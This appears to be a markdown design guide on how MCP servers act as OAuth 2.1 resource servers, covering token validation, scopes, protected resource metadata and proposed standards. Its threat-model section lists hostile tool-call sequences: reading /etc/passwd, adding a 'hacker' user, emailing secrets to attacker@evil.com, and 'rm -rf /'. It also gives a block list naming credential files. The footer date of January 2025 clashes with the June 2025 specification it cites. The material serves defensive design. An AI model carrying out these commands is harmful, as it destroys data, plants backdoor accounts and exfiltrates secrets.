# MCP Server Authentication Responsibilities

**Document Purpose**: Clarify the authentication and authorization responsibilities of MCP servers versus other components in the MCP ecosystem, based on the MCP Authorization specification (2025-06-18) and OAuth 2.1 best practices.

## 🎯 **Executive Summary**

MCP servers should act as **OAuth 2.1 Resource Servers** with clearly defined boundaries. They authenticate requests, authorize tool access, and provide guidance for scope upgrades, but **do not handle token lifecycle management or user approval workflows**.

**IMPORTANT UPDATE**: The MCP specification (2025-06-18) now uses **Protected Resource Metadata (RFC 9728)** to cleanly separate MCP servers (Resource Servers) from Authorization Servers and includes **Resource Indicators (RFC 8707)** for token audience binding.

---

## 🔐 **MCP Server Core Responsibilities**

### **✅ MUST Handle**

#### **1. Token Authentication**
```python
# Validate bearer tokens per OAuth 2.1 Section 5.2
def verify_token_from_context(ctx: Context) -> dict:
    # - Extract Bearer token from Authorization header
    # - Verify JWT signature using JWKS from authorization server
    # - Check token expiration (exp claim)
    # - Validate audience (aud claim = MCP server URI per RFC 8707)
    # - Validate issuer (iss claim = auth server URI)
    # - Extract user information and scopes
```

**Standards Compliance**: OAuth 2.1, RFC 7519 (JWT), RFC 8707 (Resource Indicators)

#### **2. Tool-Level Authorization**
```python
def check_tool_scope(ctx: Context, tool_name: str) -> dict:
    """Check if user has scope for specific tool execution"""
    user = verify_token_from_context(ctx)
    user_scopes = user.get("scope", "").split()
    
    # Tool name directly maps to required scope
    required_scope = tool_name  # e.g., "list_files", "execute_command"
    
    if required_scope not in user_scopes:
        # Return upgrade guidance, don't handle upgrade
        raise InsufficientScopeError(required_scope)
```

**Recommendation**: Use tool names as scopes for maximum granularity

#### **3. Authorization Error Responses**
```python
# MCP servers MUST return appropriate HTTP status codes per MCP specification
# Status codes as defined in MCP 2025-06-18 Error Handling:

# HTTP 401 Unauthorized: Authorization required or token invalid
# HTTP 403 Forbidden: Invalid scopes or insufficient permissions  
# HTTP 400 Bad Request: Malformed authorization request

# With tool_name = scope_name convention, simple HTTP status is sufficient:
HTTP/1.1 403 Forbidden

# Complex error response JSON is NOT needed because:
# - Client knows which tool it called (context)
# - Client can infer required scope (tool_name = scope_name)
# - Client has current token and can decode scopes
# - Client discovered token endpoint during OAuth flow
```

**Standards Compliance**: [MCP Authorization 2025-06-18 Error Handling](https://modelcontextprotocol.io/specification/2025-06-18/basic/authorization#error-handling)

#### **4. Protected Resource Metadata (NEW - RFC 9728)**
```python
# ✅ CORRECT: MCP Server exposes Protected Resource Metadata
GET /.well-known/oauth-protected-resource
{
    "resource": "https://mcp-server.example.com",
    "authorization_servers": ["https://auth-server.example.com"],
    "scopes_supported": ["list_files", "execute_command", "health_check"],
    "bearer_methods_supported": ["header"]
}

# ✅ CORRECT: WWW-Authenticate header on 401
WWW-Authenticate: Bearer resource_metadata="https://mcp-server/.well-known/oauth-protected-resource"
```

**Standards Compliance**: RFC 9728 (OAuth 2.0 Protected Resource Metadata)

**NEW REQUIREMENT - Resource Parameter (RFC 8707)**

MCP clients **MUST** include the `resource` parameter per RFC 8707 to specify the target MCP server in authorization and token requests.

**Why This is Critical**:

**1. Token Audience Binding**
```python
# Without resource parameter - SECURITY RISK
POST /oauth/authorize
{
    "client_id": "mcp-client-123",
    "scope": "execute_command list_files",
    "response_type": "code"
    # Missing: which server should this token work with?
}

# Result: Token might work with ANY server that accepts it
# Attacker could use token on unintended MCP servers
```

**2. Multi-Server Security**
```python
# User connects to multiple MCP servers:
servers = [
    "https://dev-tools.company.com/mcp",     # Development tools
    "https://prod-db.company.com/mcp",       # Production database  
    "https://email-service.company.com/mcp"  # Email system
]

# Without resource parameter:
# - Single token could work on ALL servers
# - User approves "execute_command" for dev-tools
# - Attacker uses same token on prod-db (DISASTER!)

# With resource parameter:
POST /oauth/authorize
{
    "resource": "https://dev-tools.company.com/mcp",  # Token ONLY for this server
    "scope": "execute_command",
    "client_id": "mcp-client-123"
}
```

**3. Authorization Server Token Validation**
```python
# Authorization server can validate token requests:
def validate_token_request(resource, scope, client_id):
    # Check: Is this client allowed to access this specific MCP server?
    if not is_client_authorized_for_resource(client_id, resource):
        return "unauthorized_client"
    
    # Check: Does this MCP server support these scopes?
    server_metadata = get_server_metadata(resource)
    if scope not in server_metadata["scopes_supported"]:
        return "invalid_scope"
    
    # Issue token bound to specific resource
    return issue_token(audience=resource, scope=scope)
```

**4. Prevents Token Misuse**
```python
# MCP Server token validation:
def validate_token(token, server_uri):
    claims = jwt.decode(token)
    
    # CRITICAL: Check audience claim matches this server
    if claims["aud"] != server_uri:
        raise InvalidAudienceError("Token not intended for this server")
    
    # Token is bound to THIS specific MCP server only
    return claims
```

**Example Authorization Request**:
```python
# MCP Client requesting access to specific server
POST https://auth-server/oauth/authorize
{
    "client_id": "mcp-client-123",
    "response_type": "code",
    "scope": "execute_command list_files",
    "resource": "https://mcp-server.example.com/mcp",  # REQUIRED
    "redirect_uri": "http://localhost:8080/callback",
    "code_challenge": "...",
    "code_challenge_method": "S256"
}
```

**Security Benefits**:
- ✅ **Prevents token reuse** across different MCP servers
- ✅ **Enables fine-grained authorization** per server
- ✅ **Supports multi-tenant environments** safely
- ✅ **Reduces blast radius** of compromised tokens
- ✅ **Enables audit trails** showing which server was accessed

---

## ❌ **MCP Server Should NOT Handle**

### **1. Authorization Server Responsibilities**
```python
# ❌ WRONG: MCP server acting as authorization server
GET /.well-known/oauth-authorization-server  # Don't host this!
{
    "authorization_endpoint": "https://mcp-server/authorize",  # Wrong!
    "token_endpoint": "https://mcp-server/token"              # Wrong!
}
```

**Rationale**: MCP servers are Resource Servers, not Authorization Servers per current spec

### **2. User Approval Workflows**
```python
# ❌ WRONG: MCP server handling approval requests
POST /mcp/approve-scope
{
    "user_id": "user@company.com",
    "requested_scope": "execute_command",
    "justification": "Need to run system diagnostics"
}
```

**Rationale**: User consent and approval workflows belong in the authorization server

### **3. Role Management**
```python
# ❌ WRONG: MCP server defining user roles
{
    "user_roles": ["developer", "admin"],
    "role_permissions": {
        "developer": ["list_files", "execute_command"],
        "admin": ["*"]
    }
}
```

**Rationale**: Role-to-scope mapping is an authorization server responsibility

---

## 🏗️ **Architecture Patterns**

### **✅ RECOMMENDED: Separate Authorization Server (Per Current MCP Spec)**
```
┌─────────────────┐    ┌─────────────────┐    ┌─────────────────┐
│   MCP Client    │    │   Auth Server   │    │   MCP Server    │
│                 │    │                 │    │ (Resource       │
│ - OAuth flows   │◄──►│ - Token minting │    │  Server)        │
│ - Token storage │    │ - User consent  │    │                 │
│ - Scope upgrade │    │ - Role mapping  │    │ - Token         │
└─────────────────┘    └─────────────────┘    │   validation    │
                                              │ - Tool execution│
                                              │ - PRM metadata  │
                                              └─────────────────┘
```

### **🔄 DISCOVERY FLOW (Updated per 2025-06-18 Spec)**
```
1. MCP Client → MCP Server: Initial request
2. MCP Server → MCP Client: 401 + WWW-Authenticate: Bearer resource_metadata="..."
3. MCP Client → MCP Server: GET /.well-known/oauth-protected-resource
4. MCP Server → MCP Client: {"authorization_servers": ["https://auth-server"]}
5. MCP Client → Auth Server: OAuth flow begins
```

### **MCP Server (Resource Server)**
```
┌─────────────────────────────────────┐
│ MCP Server Responsibilities         │
├─────────────────────────────────────┤
│ ✅ Authenticate tokens              │
│ ✅ Authorize tool access            │
│ ✅ Execute tools                    │
│ ✅ Provide upgrade guidance         │
│ ✅ Expose PRM metadata              │
└─────────────────────────────────────┘
```

### **Authorization Server**
```
┌─────────────────────────────────────┐
│ Auth Server Responsibilities        │
├─────────────────────────────────────┤
│ ✅ Issue/refresh tokens             │
│ ✅ Handle user authentication       │
│ ✅ Manage roles and permissions     │
│ ✅ Process approval workflows       │
│ ✅ Scope upgrade via token exchange │
└─────────────────────────────────────┘
```

### **MCP Client**
```
┌─────────────────────────────────────┐
│ MCP Client Responsibilities         │
├─────────────────────────────────────┤
│ ✅ Store tokens securely            │
│ ✅ Handle OAuth flows               │
│ ✅ Request scope upgrades           │
│ ✅ Retry with upgraded tokens       │
│ ✅ Present approval UI to users     │
└─────────────────────────────────────┘
```

---

## 🔄 **Recommended Authorization Flow**

### **1. Initial Request**
```
MCP Client → MCP Server: call_tool("execute_command", params)
Headers: Authorization: Bearer <token_with_limited_scopes>
```

### **2. Authorization Check**
```
MCP Server: 
- Validates token (signature, expiration, audience)
- Checks scopes: "execute_command" in token.scope?
- Result: INSUFFICIENT_SCOPE
```

### **3. Standard HTTP Error Response**
```
MCP Server → MCP Client: HTTP 403 Forbidden

# Client can infer upgrade needs:
# - Required scope: "execute_command" (same as tool name)
# - Current scopes: from client's stored token
# - Upgrade endpoint: from discovered OAuth metadata
```

### **4. Client Handles Upgrade**
```
MCP Client → Auth Server: RFC 8693 Token Exchange
POST /oauth/token
{
    "grant_type": "urn:ietf:params:oauth:grant-type:token-exchange",
    "subject_token": "<current_token>",
    "scope": "execute_command"
}
```

### **5. Retry with New Token**
```
MCP Client → MCP Server: call_tool("execute_command", params)
Headers: Authorization: Bearer <upgraded_token>
```

---

## 📋 **Community Standardization Needs**

### **🚨 HIGH PRIORITY - Needs Immediate Standardization**

#### **1. Scope Naming Conventions (CRITICAL)**
**Current Gap**: The MCP specification does not define standard scope formats, leading to incompatible implementations across servers and clients.

**Specific Problems**:
- **No Interoperability**: Different MCP servers use different scope formats (`list_files` vs `files:list` vs `read:files`)
- **Client Confusion**: MCP clients can't predict what scopes to request without server-specific knowledge
- **Authorization Server Complexity**: Auth servers must maintain different scope mappings for each MCP server
- **Tool Discovery Issues**: No standard way to map tool capabilities to required scopes
- **Multi-Server Conflicts**: Same tool names from different servers create scope collisions

**Real-World Impact**:
```python
# Server A uses tool names
"scope": "list_files execute_command"

# Server B uses capabilities  
"scope": "filesystem:read system:execute"

# Server C uses hierarchical
"scope": "files.list commands.execute"

# Result: MCP clients need server-specific scope logic
```

**Options Under Consideration**:
```python
# Option A: Tool names as scopes (RECOMMENDED)
"scope": "list_files execute_command health_check"

# Option B: Capability-based scopes  
"scope": "read:files execute:commands"

# Option C: Hierarchical scopes
"scope": "files:list files:read commands:execute"
```

**Recommendation**: **Tool names as scopes** for maximum granularity and simplicity

**Impact**: This single convention eliminates the need for complex error response formats, as clients can infer all necessary information for scope upgrades.

#### **2. Error Response Format (RESOLVED)**
**Current Status**: With the **tool name = scope name** convention, complex error response formats are unnecessary.

**Why This Problem is Solved**:
- **Client Context**: Client knows which tool it called when receiving the error
- **Scope Inference**: With `tool_name = scope_name` convention, client can infer required scope
- **Token Information**: Client has access to current token and can decode scopes
- **Endpoint Discovery**: Client already discovered token endpoint during OAuth flow

**Simplified Approach**:
```python
# Client makes request
mcp_client.call_tool("execute_command", params)

# Server returns standard HTTP status (no JSON body needed)
HTTP/1.1 403 Forbidden

# Client can infer everything needed for upgrade:
required_scope = "execute_command"  # Same as tool name (convention)
current_scopes = jwt.decode(token)["scope"].split()  # Client has token
token_endpoint = auth_metadata["token_endpoint"]  # Client discovered this

# Client handles upgrade automatically
if required_scope not in current_scopes:
    new_token = upgrade_token(additional_scope=required_scope)
    retry_with_new_token()
```

**Result**: **No custom error response format needed** - standard HTTP status codes are sufficient when combined with the scope naming convention.

#### **3. Protected Resource Metadata Extensions**
**Current Gap**: RFC 9728 Protected Resource Metadata provides basic OAuth discovery but lacks MCP-specific information needed for intelligent client behavior and user consent flows.

**Specific Problems**:
- **No Tool Documentation**: Clients can't explain to users what each scope/tool does
- **Missing Risk Assessment**: No way to indicate which tools are high-risk (e.g., `execute_command` vs `health_check`)
- **No Scope Grouping**: Can't indicate which scopes are commonly requested together
- **Missing Tool Metadata**: No descriptions, parameters, or usage examples for tools
- **No Upgrade Paths**: Can't indicate prerequisite scopes or upgrade sequences
- **Missing Capability Info**: No way to advertise optional vs required tool parameters

**Current Limited Metadata**:
```python
# Standard RFC 9728 - Basic but insufficient for MCP
{
    "resource": "https://mcp-server.example.com",
    "authorization_servers": ["https://auth-server.example.com"],
    "scopes_supported": ["list_files", "execute_command", "health_check"],
    "bearer_methods_supported": ["header"]
}
```

**Real-World Client Challenges**:
```python
# MCP Client receives scope list but doesn't know:
# - What does "execute_command" actually do?
# - Is it safe to auto-approve "health_check"?
# - Should "list_files" and "read_file" be requested together?
# - What parameters does each tool accept?
```

**PROPOSED MCP EXTENSION**:
```python
{
    "resource": "https://mcp-server.example.com",
    "authorization_servers": ["https://auth-server.example.com"],
    "scopes_supported": ["list_files", "execute_command", "health_check"],
    "mcp_extensions": {
        "tool_scope_mapping": {
            "list_files": {
                "description": "List directory contents",
                "risk_level": "low",
                "auto_approvable": true,
                "parameters": ["directory"],
                "commonly_grouped_with": ["read_file"]
            },
            "execute_command": {
                "description": "Execute system commands", 
                "risk_level": "high",
                "auto_approvable": false,
                "requires_user_approval": true,
                "parameters": ["command", "working_directory"],
                "prerequisite_scopes": ["health_check"]
            },
            "health_check": {
                "description": "Check server health status",
                "risk_level": "minimal",
                "auto_approvable": true,
                "parameters": []
            }
        },
        "scope_upgrade_flows": {
            "developer": ["health_check", "list_files"],
            "admin": ["health_check", "list_files", "execute_command"]
        }
    }
}
```

### **🔶 MEDIUM PRIORITY - Should Be Standardized**

#### **1. Multi-Server Scope Namespacing**
**Current Gap**: When MCP clients connect to multiple servers, tool name collisions create authorization ambiguity and security risks.

**Specific Problems**:
- **Scope Collisions**: Multiple servers with `list_files` tools - which server gets access?
- **Token Confusion**: Single token with `execute_command` scope - valid for which servers?
- **Security Boundaries**: User approves `read_database` for Server A, but token works on Server B too
- **Audit Trail Issues**: Logs show `list_files` access but can't determine which server
- **Client State Management**: MCP clients struggle to track which scopes apply to which servers

**Real-World Scenario**:
```python
# User connects to multiple MCP servers
servers = [
    "https://dev-tools.company.com/mcp",      # Has: list_files, execute_command
    "https://database.company.com/mcp",       # Has: list_files, query_data  
    "https://email-service.company.com/mcp"   # Has: send_email, list_files
]

# User approves scope: "list_files execute_command"
# Problem: Which servers can use these scopes?
# Security Risk: Token might work on unintended servers
```

**Current Workarounds (Inadequate)**:
```python
# Option 1: Separate tokens per server (complex for clients)
server_tokens = {
    "dev-tools": "token_with_dev_scopes",
    "database": "token_with_db_scopes", 
    "email": "token_with_email_scopes"
}

# Option 2: Server-specific audience claims (not standardized)
{
    "aud": "https://dev-tools.company.com/mcp",
    "scope": "list_files execute_command"
}
```

**PROPOSED NAMESPACING SOLUTIONS**:
```python
# Option A: Server prefixes in scopes
"scope": "dev-tools:list_files database:query_data email:send_email"

# Option B: Audience-based scoping  
{
    "aud": ["dev-tools.company.com", "database.company.com"],
    "scope": "list_files execute_command",
    "server_permissions": {
        "dev-tools.company.com": ["list_files", "execute_command"],
        "database.company.com": ["list_files"]
    }
}

# Option C: Hierarchical namespacing
"scope": "company.dev-tools.list_files company.database.query_data"
```

#### **2. Tool Interaction Policies**
**Current Gap**: MCP servers lack standardized ways to express and enforce security policies around dangerous tool combinations or sequences.

**Specific Problems**:
- **Privilege Escalation**: `read_config` followed by `execute_command` can lead to system compromise
- **Data Exfiltration**: `list_files` + `read_file` + `send_email` creates data leak risk
- **No Context Awareness**: Each tool call is authorized independently without considering previous actions
- **Missing Temporal Policies**: No way to enforce "cooling off" periods between high-risk operations
- **No Session Tracking**: Can't prevent dangerous tool combinations within a session

**Real-World Attack Scenarios**:
```python
# Scenario 1: Config-based privilege escalation
1. User calls list_files("/etc") → Approved (seems harmless)
2. User calls read_file("/etc/passwd") → Approved (file reading seems OK)
3. User calls execute_command("useradd hacker") → Uses config knowledge to escalate

# Scenario 2: Data exfiltration chain
1. User calls list_files("/sensitive") → Approved
2. User calls read_file("/sensitive/secrets.json") → Approved  
3. User calls send_email(to="attacker@evil.com", body=secrets) → Data stolen

# Scenario 3: Reconnaissance then attack
1. User calls health_check() → Always approved
2. User calls list_files("/") → Approved for troubleshooting
3. User calls execute_command("rm -rf /") → Uses recon to maximize damage
```

**Current Inadequate Approaches**:
```python
# Simple per-tool authorization (insufficient)
if required_scope not in user_scopes:
    return "insufficient_scope"

# No consideration of:
# - Previous tool calls in session
# - Tool call sequences
# - Time-based restrictions
# - Risk accumulation
```

**PROPOSED TOOL INTERACTION POLICIES**:
```python
{
    "tool_interaction_policies": {
        "execute_command": {
            "blocked_after": ["read_file:/etc/*", "list_files:/etc"],
            "requires_approval_after": ["read_config", "list_files:/sensitive/*"],
            "cooling_period_minutes": 5,
            "max_calls_per_session": 3
        },
        "send_email": {
            "blocked_after": ["read_file:*.json", "read_file:*.key"],
            "requires_approval_after": ["list_files", "read_file"],
            "requires_human_review": true
        },
        "read_file": {
            "blocked_patterns": ["/etc/shadow", "*.key", "*.pem"],
            "requires_approval_after": ["list_files:/etc", "list_files:/home/*"],
            "max_file_size_mb": 10
        }
    },
    "session_policies": {
        "max_high_risk_calls": 5,
        "require_reauth_after_minutes": 30,
        "block_rapid_escalation": true
    }
}
```

**Implementation Challenges**:
- **State Management**: Servers must track tool call history per session
- **Performance Impact**: Policy evaluation adds latency to each tool call
- **Policy Complexity**: Balancing security with usability
- **Cross-Server Coordination**: Policies may need to span multiple MCP servers

### **🔷 LOW PRIORITY - Implementation Specific**

#### **1. Token Performance Optimizations**
- Scope caching strategies
- Bitmap vs string scope representations
- Token size optimization

#### **2. Advanced Security Features**
- Session-based tool tracking
- Audit logging formats
- Risk-based authorization

---

## 🎯 **Implementation Checklist**

### **For MCP Server Developers**
- [ ] Implement OAuth 2.1 token validation
- [ ] Use tool names as scopes (enables simple error handling)
- [ ] Return standard HTTP status codes (403 for insufficient scope)
- [ ] Expose Protected Resource Metadata (RFC 9728)
- [ ] **DO NOT** handle token upgrades or user approvals

### **For Auth Server Developers**  
- [ ] Map user roles to tool-level scopes
- [ ] Implement RFC 8693 token exchange
- [ ] Handle user approval workflows
- [ ] Support dynamic client registration (RFC 7591)

### **For MCP Client Developers**
- [ ] Handle insufficient scope errors gracefully
- [ ] Implement OAuth flows for token upgrades
- [ ] Store tokens securely
- [ ] Present approval UI to users

---

## 📚 **Standards References**

- **OAuth 2.1**: [IETF Draft](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-v2-1)
- **RFC 8414**: OAuth 2.0 Authorization Server Metadata
- **RFC 8693**: OAuth 2.0 Token Exchange  
- **RFC 7591**: OAuth 2.0 Dynamic Client Registration
- **RFC 7519**: JSON Web Token (JWT)
- **RFC 9728**: OAuth 2.0 Protected Resource Metadata
- **RFC 8707**: Resource Indicators for OAuth 2.0 (NEW)
- **MCP Authorization**: [MCP Specification](https://modelcontextprotocol.io/specification/2025-06-18/basic/authorization)

---

## 🤝 **Call for Community Input**

**This document represents current best practices but requires community consensus on:**

1. **Scope naming conventions** (tool names vs capabilities vs hierarchical) - **CRITICAL**
2. ~~Standard error response format~~ - **RESOLVED** (simple HTTP status codes sufficient with scope naming convention)
3. **Protected Resource Metadata extensions** for MCP-specific information
4. **Multi-server namespacing** strategies

**Please contribute to the discussion at**: [MCP Community Forums](https://github.com/modelcontextprotocol/specification/discussions)

---

*Document Version: 1.2*  
*Last Updated: January 2025*  
*Status: Updated per MCP Specification 2025-06-18* 